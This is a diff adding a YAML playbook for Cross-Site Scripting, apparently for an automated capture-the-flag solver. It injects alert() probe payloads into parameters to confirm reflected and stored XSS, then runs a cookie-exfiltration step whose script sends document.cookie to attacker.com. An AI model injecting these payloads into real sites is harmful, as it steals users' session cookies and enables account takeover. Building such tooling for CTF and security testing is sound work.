@@ -1,0 +1,73 @@
+id: web_xss
+name: Cross-Site Scripting
+category: web
+version: "1.0"
+author: system
+description: >
+  Detects and exploits XSS via reflected and stored techniques.
+
+applies_when:
+  - "context.challenge.type == 'web'"
+
+confidence_seeds:
+  - if: "any(p in context.params for p in ['search', 'q', 'query', 'name', 'comment', 'msg'])"
+    boost: 0.25
+    label: "XSS-prone parameter found"
+  - if: "any(p in context.found_paths for p in ['/search', '/contact', '/profile'])"
+    boost: 0.15
+    label: "User-input path found"
+
+detection:
+  min_confidence: 0.10
+  paths:
+    - id: reflected_xss
+      name: "Reflected XSS Detection"
+      steps:
+        - id: script_probe
+          action: http_probe
+          with:
+            payloads: 
+              - "<script>alert('XSS_TEST')</script>"
+              - "<img src=x onerror=alert('XSS_TEST')>"
+              - "<svg onload=alert('XSS_TEST')>"
+            inject_into: all_params
+          signals:
+            - match: '<script>alert\(''XSS_TEST''\)</script>|alert\(''XSS_TEST''\)|<img src=x onerror=|<svg onload='
+              on_match:
+                confidence_boost: 0.85
+                emit: xss_reflected_confirmed
+
+    - id: stored_xss
+      name: "Stored XSS Detection"
+      steps:
+        - id: submit_marker
+          action: http_probe
+          with:
+            payload: "<script>alert('STORED_XSS_MARKER')</script>"
+            inject_into: all_params
+          on_success: check_marker
+        
+        - id: check_marker
+          action: http_probe
+          with:
+            # Re-fetch the same page or a list page
+            inject_into: none
+          signals:
+            - match: "STORED_XSS_MARKER"
+              on_match:
+                confidence_boost: 0.95
+                emit: xss_stored_confirmed
+
+exploitation:
+  stop_on_flag: true
+  paths:
+    - id: cookie_exfil
+      name: "Cookie Exfiltration"
+      requires_signal: xss_reflected_confirmed
+      technique: reflected_exfil
+      steps:
+        - id: inject_exfil
+          action: http_probe
+          with:
+            payload: "<script>fetch('http://attacker.com/log?c=' + document.cookie)</script>"
+            inject_into: vulnerable_param
